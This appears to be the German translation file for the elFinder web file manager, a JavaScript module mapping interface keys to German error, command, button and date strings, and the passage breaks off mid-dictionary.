/**
 * Deutsch translation
 * @author JPG & Mace <dev@flying-datacenter.de>
 * @author tora60 from pragmaMx.org
 * @author Timo-Linde <info@timo-linde.de>
 * @author OSWorX <info@osworx.net>
 * @author Maximilian Schwarz <info@deefuse.de>
 * @author SF Webdesign <webdesign@stephan-frank.de>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.de = {
		translator : 'JPG & Mace &lt;dev@flying-datacenter.de&gt;, tora60 from pragmaMx.org, Timo-Linde &lt;info@timo-linde.de&gt;, OSWorX &lt;info@osworx.net&gt;, Maximilian Schwarz &lt;info@deefuse.de&gt;, SF Webdesign &lt;webdesign@stephan-frank.de&gt;',
		language   : 'Deutsch',
		direction  : 'ltr',
		dateFormat : 'j. F Y H:i', // will show like: 28. Februar 2022 13:17
		fancyDateFormat : '$1 H:i', // will show like: Heute 13:17
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-131758
		messages   : {
			'getShareText' : 'Aktie',
			'Editor ': 'Kodex-Editor',
			/********************************** errors **********************************/
			'error'                : 'Fehler',
			'errUnknown'           : 'Unbekannter Fehler.',
			'errUnknownCmd'        : 'Unbekannter Befehl.',
			'errJqui'              : 'Ungültige jQuery UI-Konfiguration. Die Komponenten Selectable, Draggable und Droppable müssen inkludiert sein.',
			'errNode'              : 'Für elFinder muss das DOM-Element erstellt werden.',
			'errURL'               : 'Ungültige elFinder-Konfiguration! Die URL-Option ist nicht gesetzt.',
			'errAccess'            : 'Zugriff verweigert.',
			'errConnect'           : 'Verbindung zum Backend fehlgeschlagen.',
			'errAbort'             : 'Verbindung abgebrochen.',
			'errTimeout'           : 'Zeitüberschreitung der Verbindung.',
			'errNotFound'          : 'Backend nicht gefunden.',
			'errResponse'          : 'Ungültige Backend-Antwort.',
			'errConf'              : 'Ungültige Backend-Konfiguration.',
			'errJSON'              : 'PHP JSON-Modul nicht vorhanden.',
			'errNoVolumes'         : 'Keine lesbaren Laufwerke vorhanden.',
			'errCmdParams'         : 'Ungültige Parameter für Befehl: "$1".',
			'errDataNotJSON'       : 'Daten nicht im JSON-Format.',
			'errDataEmpty'         : 'Daten sind leer.',
			'errCmdReq'            : 'Backend-Anfrage benötigt Befehl.',
			'errOpen'              : 'Kann "$1" nicht öffnen.',
			'errNotFolder'         : 'Objekt ist kein Ordner.',
			'errNotFile'           : 'Objekt ist keine Datei.',
			'errRead'              : 'Kann "$1" nicht öffnen.',
			'errWrite'             : 'Kann nicht in "$1" schreiben.',
			'errPerm'              : 'Zugriff verweigert.',
			'errLocked'            : '"$1" ist gesperrt und kann nicht umbenannt, verschoben oder gelöscht werden.',
			'errExists'            : 'Die Datei "$1" existiert bereits.',
			'errInvName'           : 'Ungültiger Dateiname.',
			'errInvDirname'        : 'Ungültiger Ordnername.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Ordner nicht gefunden.',
			'errFileNotFound'      : 'Datei nicht gefunden.',
			'errTrgFolderNotFound' : 'Zielordner "$1" nicht gefunden.',
			'errPopup'             : 'Der Browser hat das Pop-Up-Fenster unterbunden. Um die Datei zu öffnen, Pop-Ups in den Browsereinstellungen aktivieren.',
			'errMkdir'             : 'Kann Ordner "$1" nicht erstellen.',
			'errMkfile'            : 'Kann Datei "$1" nicht erstellen.',
			'errRename'            : 'Kann "$1" nicht umbenennen.',
			'errCopyFrom'          : 'Kopieren von Dateien von "$1" nicht erlaubt.',
			'errCopyTo'            : 'Kopieren von Dateien nach "$1" nicht erlaubt.',
			'errMkOutLink'         : 'Der Link kann nicht außerhalb der Partition führen.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Upload-Fehler.',  // old name - errUploadCommon
			'errUploadFile'        : 'Kann "$1" nicht hochladen.', // old name - errUpload
			'errUploadNoFiles'     : 'Keine Dateien zum Hochladen gefunden.',
			'errUploadTotalSize'   : 'Gesamtgröße überschreitet die Maximalgröße.', // old name - errMaxSize
			'errUploadFileSize'    : 'Die Datei überschreitet die Maximalgröße.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Dateiart (mime) nicht zulässig.',
			'errUploadTransfer'    : '"$1" Übertragungsfehler.',
			'errUploadTemp'        : 'Kann temporäre Datei nicht erstellen.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Das Objekt "$1" existiert bereits an dieser Stelle und kann nicht durch ein Objekt eines anderen Typs ersetzt werden.', // new
			'errReplace'           : 'Kann "$1" nicht ersetzen.',
			'errSave'              : 'Kann "$1" nicht speichern.',
			'errCopy'              : 'Kann "$1" nicht kopieren.',
			'errMove'              : 'Kann "$1" nicht verschieben.',
			'errCopyInItself'      : '"$1" kann sich nicht in sich selbst kopieren.',
			'errRm'                : 'Kann "$1" nicht entfernen.',
			'errTrash'             : 'Kann Objekt nicht in Mülleimer legen.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Kann Quelldatei(en) nicht entfernen.',
			'errExtract'           : 'Kann "$1" nicht entpacken.',
			'errArchive'           : 'Archiv konnte nicht erstellt werden.',
			'errArcType'           : 'Archivtyp nicht untersützt.',
			'errNoArchive'         : 'Bei der Datei handelt es sich nicht um ein Archiv, oder die Archivart wird nicht unterstützt.',
			'errCmdNoSupport'      : 'Das Backend unterstützt diesen Befehl nicht.',
			'errReplByChild'       : 'Der Ordner "$1" kann nicht durch etwas ersetzt werden, das ihn selbst enthält.',
			'errArcSymlinks'       : 'Aus Sicherheitsgründen ist es verboten, ein Archiv mit symbolischen Links zu extrahieren.', // edited 24.06.2012
			'errArcMaxSize'        : 'Die Archivdateien übersteigen die maximal erlaubte Größe.',
			'errResize'            : 'Größe von "$1" kann nicht geändert werden.',
			'errResizeDegree'      : 'Ungültiger Rotationswert.',  // added 7.3.2013
			'errResizeRotate'      : 'Bild konnte nicht gedreht werden.',  // added 7.3.2013
			'errResizeSize'        : 'Ungültige Bildgröße.',  // added 7.3.2013
			'errResizeNoChange'    : 'Bildmaße nicht geändert.',  // added 7.3.2013
			'errUsupportType'      : 'Nicht unterstützte Dateiart.',
			'errNotUTF8Content'    : 'Die Datei "$1" ist nicht im UTF-8-Format und kann nicht bearbeitet werden.',  // added 9.11.2011
			'errNetMount'          : 'Verbindung mit "$1" nicht möglich.', // added 17.04.2012
			'errNetMountNoDriver'  : 'Nicht unterstütztes Protokoll.',     // added 17.04.2012
			'errNetMountFailed'    : 'Verbindung fehlgeschlagen.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Host benötigt.', // added 18.04.2012
			'errSessionExpires'    : 'Diese Sitzung ist aufgrund von Inaktivität abgelaufen.',
			'errCreatingTempDir'   : 'Erstellung des temporären Ordners nicht möglich: "$1"',
			'errFtpDownloadFile'   : 'Download der Datei über FTP nicht möglich: "$1"',
			'errFtpUploadFile'     : 'Upload der Datei zu FTP nicht möglich: "$1"',
			'errFtpMkdir'          : 'Erstellung des Remote-Ordners mit FTP nicht möglich: "$1"',
			'errArchiveExec'       : 'Fehler beim Archivieren der Dateien: "$1"',
			'errExtractExec'       : 'Fehler beim Extrahieren der Dateien: "$1"',
			'errNetUnMount'        : 'Kann nicht ausgehängt werden.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Kann nicht zu UTF-8 konvertiert werden.', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Ordner kann nich hochladen werden, eventuell mit Google Chrome versuchen.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Zeitüberschreitung während der Suche nach "$1". Suchergebnis ist unvollständig.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Erneutes Anmelden ist erforderlich.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Die maximale Anzahl auswählbarer Elemente ist $1', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Datei konnte nicht aus Mülleimer wieder hergestellt werden bzw. Ziel für Wiederherstellung nicht gefunden.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Kein Editor für diesen Dateityp gefunden.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Ein serverseitiger Fehler trat auf.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Konnte Ordner "$1" nicht Leeren.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Es sind noch $1 weitere Fehler.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Sie können bis zu $1 Ordner gleichzeitig erstellen.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Archiv erstellen',
			'cmdback'      : 'Zurück',
			'cmdcopy'      : 'Kopieren',
			'cmdcut'       : 'Ausschneiden',
			'cmddownload'  : 'Herunterladen',
			'cmdduplicate' : 'Duplizieren',
			'cmdedit'      : 'Datei bearbeiten',
			'cmdextract'   : 'Archiv entpacken',
			'cmdforward'   : 'Vorwärts',
			'cmdgetfile'   : 'Datei auswählen',
			'cmdhelp'      : 'Über diese Software',
			'cmdhome'      : 'Startordner',
			'cmdinfo'      : 'Informationen',
			'cmdmkdir'     : 'Neuer Ordner',
			'cmdmkdirin'   : 'In neuen Ordner', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Neuer Datei',
			'cmdopen'      : 'Öffnen',
			'cmdpaste'     : 'Einfügen',
			'cmdquicklook' : 'Vorschau',
			'cmdreload'    : 'Aktualisieren',
			'cmdrename'    : 'Umbenennen',
			'cmdrm'        : 'Löschen',
			'cmdtrash'     : 'In den Mülleimer legen', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Wiederherstellen', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Suchen',
			'cmdup'        : 'In übergeordneten Ordner wechseln',
			'cmdupload'    : 'Datei hochladen',
			'cmdview'      : 'Ansehen',
			'cmdresize'    : 'Größe ändern & drehen',
			'cmdsort'      : 'Sortieren',
			'cmdnetmount'  : 'Verbinde mit Netzwerkspeicher', // added 18.04.2012
			'cmdnetunmount': 'Abhängen', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Favoriten', // added 28.12.2014
			'cmdchmod'     : 'Berechtigung ändern', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Einen Ordner öffnen', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Spaltenbreite zurücksetzen', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Vollbild', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Verschieben', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Ordner Leeren', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Rückgängig', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Wiederholen', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Einstellungen', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Alle auswählen', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Keine auswählen', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Auswahl rückgängig machen', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'In neuem Fenster öffnen', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Verstecken', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Schließen',
			'btnSave'   : 'Speichern',
			'btnRm'     : 'Entfernen',
			'btnApply'  : 'Anwenden',
			'btnCancel' : 'Abbrechen',
			'btnNo'     : 'Nein',
			'btnYes'    : 'Ja',
			'btnMount'  : 'Verbinden',  // added 18.04.2012
			'btnApprove': 'Gehe zu $1 und genehmige', // from v2.1 added 26.04.2012
			'btnUnmount': 'Auswerfen', // from v2.1 added 30.04.2012
			'btnConv'   : 'Konvertieren', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Arbeitspfad',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Partition',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Alle',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME-Typ', // from v2.1 added 22.5.2015
			'btnFileName':'Dateiname',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Speichern & Schließen', // from v2.1 added 12.6.2015
			'btnBackup' : 'Sicherung', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Umbenennen',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Alle Umbenennen', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Zurück ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Weiter ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Speichern als', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Öffne Ordner',
			'ntffile'     : 'Öffne Datei',
			'ntfreload'   : 'Ordnerinhalt neu',
			'ntfmkdir'    : 'Erstelle Ordner',
			'ntfmkfile'   : 'Erstelle Dateien',
			'ntfrm'       : 'Lösche Dateien',
			'ntfcopy'     : 'Kopiere Dateien',
			'ntfmove'     : 'Verschiebe Dateien',
			'ntfprepare'  : 'Kopiervorgang initialisieren',
			'ntfrename'   : 'Benenne Dateien um',
			'ntfupload'   : 'Dateien hochladen',
			'ntfdownload' : 'Dateien herunterladen',
			'ntfsave'     : 'Speichere Datei',
			'ntfarchive'  : 'Erstelle Archiv',
			'ntfextract'  : 'Entpacke Dateien',
			'ntfsearch'   : 'Suche',
			'ntfresize'   : 'Bildgrößen ändern',
			'ntfsmth'     : 'Bin beschäftigt ..',
			'ntfloadimg'  : 'Lade Bild ..',
			'ntfnetmount' : 'Mit Netzwerkspeicher verbinden', // added 18.04.2012
			'ntfnetunmount': 'Netzwerkspeicher auswerfen', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Bildgröße erfassen', // added 20.05.2013
			'ntfreaddir'  : 'Lese Ordnerinformationen', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Hole URL von Link', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Ändere Dateiberechtigungen', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Upload-Dateinamen überprüfen', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Erstelle Datei zum Download', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Beziehe Pfad Informationen', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Upload läuft', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Bewege in den Mülleimer', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Wiederherstellung aus Mülleimer', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Prüfe Zielordner', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Vorherige Operation rückgängig machen', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Wiederherstellen', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Überprüfe Inhalte', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Mülleimer', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'unbekannt',
			'Today'       : 'Heute',
			'Yesterday'   : 'Gestern',
			'msJan'       : 'Januar',
			'msFeb'       : 'Februar',
			'msMar'       : 'Mär',
			'msApr'       : 'Apr',
			'msMay'       : 'Mai',
			'msJun'       : 'Juni',
			'msJul'       : 'Juli',
			'msAug'       : 'Aug',
			'msSep'       : 'Sep',
			'msOct'       : 'Okt',
			'msNov'       : 'Nov',
			'msDec'       : 'Dez',
			'January'     : 'Januar',
			'February'    : 'Februar',
			'March'       : 'März',
			'April'       : 'April',
			'May'         : 'Mai',
			'June'        : 'Juni',
			'July'        : 'Juli',
			'August'      : 'August',
			'September'   : 'September',
			'October'     : 'Oktober',
			'November'    : 'November',
			'December'    : 'Dezember',
			'Sunday'      : 'Sonntag',
			'Monday'      : 'Montag',
			'Tuesday'     : 'Dienstag',
			'Wednesday'   : 'Mittwoch',
			'Thursday'    : 'Donnerstag',
			'Friday'      : 'Freitag',
			'Saturday'    : 'Samstag',
			'Sun'         : 'So',
			'Mon'         : 'Mo',
			'Tue'         : 'Di',
			'Wed'         : 'Mi',
			'Thu'         : 'Do',
			'Fri'         : 'Fr',
			'Sat'         : 'Sa',

			/******************************** sort variants ********************************/
			'sortname'          : 'nach Name',
			'sortkind'          : 'nach Art',
			'sortsize'          : 'nach Größe',
			'sortdate'          : 'nach Datum',
			'sortFoldersFirst'  : 'Ordner zuerst',
			'sortperm'          : 'nach Berechtigung', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'nach Modus',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'nach Besitzer',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'nach Gruppe',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'auch Baumansicht',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Neues Textdokument.txt', // added 10.11.2015
			'untitled folder'   : 'Neuer Ordner',   // added 10.11.2015
			'Archive'           : 'Neues Archiv',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Neue Datei.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Datei',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Bestätigung benötigt',
			'confirmRm'       : 'Sollen die Dateien gelöscht werden?<br>Vorgang ist endgültig!',
			'confirmRepl'     : 'Datei ersetzen?',
			'confirmRest'     : 'Vorhandenes Element durch das Element aus Mülleimer ersetzen?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Nicht UTF-8 kodiert<br>Zu UTF-8 konvertieren?<br>Inhalte werden zu UTF-8 konvertiert bei Speicherung.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Die Zeichencodierung dieser Datei konnte nicht erkannt werden. Es muss vorübergehend in UTF-8 zur Bearbeitung konvertiert werden.<br> Bitte eine Zeichenkodierung dieser Datei auswählen.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Die Datei wurde geändert.<br>Änderungen gehen verloren wenn nicht gespeichert wird.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Sicher diese Elemente in den Mülleimer verschieben?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Sicher alle Elemente nach "$1" verschieben?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Alles bestätigen',
			'name'            : 'Name',
			'size'            : 'Größe',
			'perms'           : 'Berechtigungen',
			'modify'          : 'Geändert',
			'kind'            : 'Typ',
			'read'            : 'Lesen',
			'write'           : 'Schreiben',
			'noaccess'        : 'Kein Zugriff',
			'and'             : 'und',
			'unknown'         : 'unbekannt',
			'selectall'       : 'Alle Dateien auswählen',
			'selectfiles'     : 'Dateien auswählen',
			'selectffile'     : 'Erste Datei auswählen',
			'selectlfile'     : 'Letzte Datei auswählen',
			'viewlist'        : 'Spaltenansicht',
			'viewicons'       : 'Symbolansicht',
			'viewSmall'       : 'Kleine Icons', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Medium Icons', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Große Icons', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Extragroße Icons', // from v2.1.39 added 22.5.2018
			'places'          : 'Favoriten',
			'calc'            : 'Berechne',
			'path'            : 'Pfad',
			'aliasfor'        : 'Verknüpfung zu',
			'locked'          : 'Gesperrt',
			'dim'             : 'Bildgröße',
			'files'           : 'Dateien',
			'folders'         : 'Ordner',
			'items'           : 'Objekte',
			'yes'             : 'ja',
			'no'              : 'nein',
			'link'            : 'Link',
			'searcresult'     : 'Suchergebnisse',
			'selected'        : 'Objekte ausgewählt',
			'about'           : 'Über',
			'shortcuts'       : 'Tastenkombinationen',
			'help'            : 'Hilfe',
			'webfm'           : 'Web-Dateiverwaltung',
			'ver'             : 'Fassung',
			'protocolver'     : 'Protokoll-Version',
			'homepage'        : 'Projekt-Webseite',
			'docs'            : 'Dokumentation',
			'github'          : 'Forke uns auf Github',
			'twitter'         : 'Folge uns auf twitter',
			'facebook'        : 'Begleite uns auf facebook',
			'team'            : 'Mannschaft',
			'chiefdev'        : 'Chefentwickler',
			'developer'       : 'Entwickler',
			'contributor'     : 'Unterstützer',
			'maintainer'      : 'Maintainer',
			'translator'      : 'Übersetzer',
			'icons'           : 'Symbole',
			'dontforget'      : 'und vergiss nicht .. morgen ist auch noch ein Tag ..',
			'shortcutsof'     : 'Tastenkombinationen deaktiviert',
			'dropFiles'       : 'Dateien hier ablegen',
			'or'              : 'oder',
			'selectForUpload' : 'Dateien zum Upload auswählen',
			'moveFiles'       : 'Dateien verschieben',
			'copyFiles'       : 'Dateien kopieren',
			'restoreFiles'    : 'Elemente wiederherstellen', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Lösche von Favoriten',
			'aspectRatio'     : 'Seitenverhältnis',
			'scale'           : 'Maßstab',
			'width'           : 'Breite',
			'height'          : 'Höhe',
			'resize'          : 'Größe ändern',
			'crop'            : 'Zuschneiden',
			'rotate'          : 'Drehen',
			'rotate-cw'       : 'Drehe 90° im Uhrzeigersinn',
			'rotate-ccw'      : 'Drehe 90° gegen Uhrzeigersinn',
			'degree'          : '°',
			'netMountDialogTitle' : 'verbinde Netzwerkspeicher', // added 18.04.2012
			'protocol'            : 'Protokoll', // added 18.04.2012
			'host'                : 'Gastgeber', // added 18.04.2012
			'port'                : 'Hafen', // added 18.04.2012
			'user'                : 'Benutzer', // added 18.04.2012
			'pass'                : 'Passwort', // added 18.04.2012
			'confirmUnmount'      : 'Soll "$1" ausgehängt werden',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Dateien in den Browser ziehen', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Dateien hier loslassen', // from v2.1 added 07.04.2014
			'encoding'        : 'Kodierung', // from v2.1 added 19.12.2014
			'locale'          : 'Lokal',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Ziel: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Suche nach MIME-Typ', // from v2.1 added 22.5.2015
			'owner'           : 'Besitzer', // from v2.1 added 20.6.2015
			'group'           : 'Gruppe', // from v2.1 added 20.6.2015
			'other'           : 'Andere', // from v2.1 added 20.6.2015
			'execute'         : 'Ausführen', // from v2.1 added 20.6.2015
			'perm'            : 'Berechtigung', // from v2.1 added 20.6.2015
			'mode'            : 'Modus', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Der Ordner ist leer', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Der Ordner ist leer\\A Elemente durch Ziehen hinzufügen', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Der Ordner ist leer\\A Elemente durch langes Tippen hinzufügen', // from v2.1.6 added 30.12.2015
			'quality'         : 'Qualität', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Automatische Synchronisation',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Nach oben bewegen',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'URL-Link holen', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Ausgewählte Objekte ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'Ordner-ID', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Offline-Zugriff erlauben', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Erneut anmelden', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Wird geladen...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'mehrere Dateien öffnen', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Es wird versucht die $1 Dateien zu öffnen .. sicher im Browser öffnen?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Kein Suchergebnis', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Datei wird bearbeitet.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : '$1 Objekt(e) ausgewählt.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : '$1 Objekte im Clipboard.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Inkrementelle Suche bezieht sich nur auf die aktuelle Ansicht.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Wiederherstellen', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 abgeschlossen', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontextmenü', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Seite umblättern', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Volume-Rootverzeichnisse', // from v2.1.16 added 16.9.2016
			'reset'           : 'Neustart', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Hintergrund Farbe', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Farbauswahl', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px Raster', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Ein', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Aus', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Keine Ergebnisse in der aktuellen Anzeige', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Die Ergebnisse der ersten Buchstabensuche sind in der aktuellen Ansicht leer.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Text Bezeichnung', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 Minuten übrig', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Wiedereröffnen mit ausgewählter Codierung', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Speichern mit der gewählten Kodierung', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Verzeichnis auswählen', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Erster Buchstabe suche', // from v2.1.23 added 24.3.2017
			'presets'         : 'Voreinstellungen', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Zu viele Elemente auf einmal für den Mülleimer.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Textbereich', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Leere Ordner "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Es befinden sich keine Elemente im Ordner "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Einstellungen', // from v2.1.26 added 28.6.2017
			'language'        : 'Spracheinstellungen', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Initialisiere die Einstellungen, welche in diesem Browser gespeichert sind', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Toolbareinstellung', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 Zeichen übrig',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 Zeilen übrig.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Summe', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Ungefähre Dateigröße', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Fokussierung auf das Element Dialog mit Mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Auswählen', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Aktion bei der Auswahl der Datei', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Öffnen mit dem zuletzt verwendeten Editor', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Auswahl umkehren', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Sicher $1 ausgewählte Elemente in $2 umbenennen?<br>Rückgängig nicht möglich!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Stapelumbenennung', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Nummer', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Vorzeichen hinzufügen', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Nachzeichen hinzufügen', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Erweiterung ändern', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Spalteneinstellungen (Listenansicht)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Alle Änderungen werden sofort im Archiv angewendet.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Alle Änderungen werden nicht angewendet bis dieses Volume entfernt wird.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Die folgenden Datenträger, die auf diesem Datenträger eingehängt sind, werden ebenfalls ausgehängt. Sicher dass alle aushängt werden sollen?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Auswahl Info', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Datei-Hash-Algorithmen', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Info-Elemente (Auswahl-Info-Panel)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Drücken Sie erneut, um zu beenden.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Symbolleiste', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Arbeitsplatz', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'Alle', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Icongröße (Symbolansicht)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Öffne Editorfenster in voller Größe', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Aktuell keine API zur Bearbeitung verfügbar, bitte auf Webseite bearbeiten', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Um zu speichern nach der Bearbeitung Element entweder mit URL hochladen oder mit herunter geladener Datei', //from v2.1.40 added 8.7.2018
